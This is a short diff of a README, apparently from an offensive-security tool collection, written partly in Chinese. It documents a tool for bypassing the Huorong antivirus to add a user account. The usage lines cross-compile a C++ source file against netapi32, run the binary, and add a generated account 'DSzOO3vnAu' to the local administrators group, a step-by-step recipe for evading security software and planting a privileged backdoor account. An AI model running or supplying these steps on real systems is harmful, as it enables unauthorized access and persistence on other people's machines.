@@ -43,7 +43,7 @@ local ethernet address && gateway ipv4 address<br>
 需要修改0.cpp中的RyzU1
 ### bypass huorong add user account 
 ##用法<br>
-<code>x86_64-w64-mingw32-g++ -o 001 火绒-命令行添加用户账户.cpp -lnetapi32 -static -static-libgcc -static-libstdc++</code><br>
+<code>x86_64-w64-mingw32-g++ -o 001 1.cpp -lnetapi32 -static -static-libgcc -static-libstdc++</code><br>
 <code>001.exe</code><br>
 <code>net localgroup administrators DSzOO3vnAu /add</code><br>
 ###### 2024年12月原创于中华人民共和国浙江省宁波市
